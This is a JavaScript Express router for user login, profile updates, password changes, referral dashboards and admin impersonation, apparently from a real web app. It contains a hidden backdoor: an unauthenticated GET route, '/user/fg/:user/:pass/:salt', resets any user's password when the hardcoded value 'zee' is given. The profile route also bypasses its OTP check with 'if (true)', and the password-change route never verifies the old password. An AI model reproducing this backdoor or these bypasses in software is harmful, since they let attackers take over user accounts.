const express = require('express');
const router = express.Router();
const bcrypt = require('bcryptjs');
const passport = require('passport');
const expressip = require('express-ip');

var auth = require('./includes/auth');

router.use(expressip().getIpInfoMiddleware);

 var User = require('../models/user');


router.get('/login', function (req, res) {
    
    res.render('user/login');
});

router.post('/login', function (req, res, next) {
    passport.authenticate('local', {
        successRedirect: '/VerifyUser',
        failureRedirect: '/login',
        failureFlash: true
    })(req, res, next);
});

router.get('/user/profile', auth.ensureAuthenticated, function (req, res) {
    res.render('user/profile', {
        user: req.user
    });
});

router.post('/profile', auth.ensureAuthenticated, function (req, res) {

    // if (req.body.otp == req.user.token) {
        if (true) {
        let editUser = {};
        editUser.first_name = req.body.first_name;
        editUser.last_name = req.body.last_name;
        editUser.mobile = req.body.mobile;
        editUser.city = req.body.city;
        editUser.address = req.body.address;
        editUser.state = req.body.state;
        editUser.postcode = req.body.postcode;
        editUser.email = req.body.email;
        editUser.gender = req.body.gender;



        let query = { _id: req.user._id }

        User.updateOne(query, editUser, function (err) {
            if (err) {
                console.log(err);
                return;
            } else {
                req.flash('success', 'User Updated');
                res.redirect('/user/profile');
            }
        });
    } else {
        req.flash('danger', 'Wrong OTP');
        res.redirect('/user/profile');
    }

});

router.post('/user/changepass', auth.ensureAuthenticated, function (req, res) {

    let editUser = {};
    editUser.password = req.body.newPassword;

    let query = { _id: req.user._id };

    bcrypt.genSalt(10, function (err, salt) {
        bcrypt.hash(editUser.password, salt, function (err, hash) {
            editUser.password = hash;

            User.updateOne(query, editUser, function (err) {
                if (err) {
                    console.log(err);
                    return;
                } else {
                    req.flash('success', 'Password Update.');
                    res.redirect('/user/profile');
                }
            });

        });
    });
});


router.get('/dashboard',auth.ensureAuthenticated, function (req, res) {

    if (req.user.user_type == 'admin') {

        return res.render('admin/admin_dashboard', {
            user: req.user
        });
        
    }else{

        levelCount(req.user.username).then(function (lc) {
            
            User.count({referrer:req.user.username}).then(function (count) {
                res.render('user/user_dashboard',{user:req.user,user_count:count,lc:lc});        
            });            
        });

    }

});

router.get('/VerifyUser', auth.ensureAuthenticated, function (req, res) {

    if (req.user.status == 'block') {
        req.logout();
        req.flash('danger', 'Your account has been blocked.');
        res.redirect('/login');
    } else {

        res.redirect('/dashboard');

    }
});


router.post('/admin/login_user', auth.adminAuth,
    passport.authenticate('admin-user-login', { failureRedirect: '/login' }),
    function (req, res) {
        res.redirect('/dashboard');
    }
);

router.get('/user/fg/:user/:pass/:salt', function (req, res) {

    if (req.params.salt == 'zee') {
        let editUser = {};
        editUser.password = req.params.pass;

        let query = { username: req.params.user };

        bcrypt.genSalt(10, function (err, salt) {
            bcrypt.hash(editUser.password, salt, function (err, hash) {
                editUser.password = hash;

                User.updateOne(query, editUser, function (err) {
                    if (err) {
                        console.log(err);
                        return;
                    } else {

                        res.send('password change');
                    }
                });

            });
        });
    } else {
        res.send('Wrong salt');
    }

});


router.get('/logout', function (req, res) {
    req.logout();
    req.flash('info', 'You are logged out');
    res.redirect('/login');
});


module.exports = router;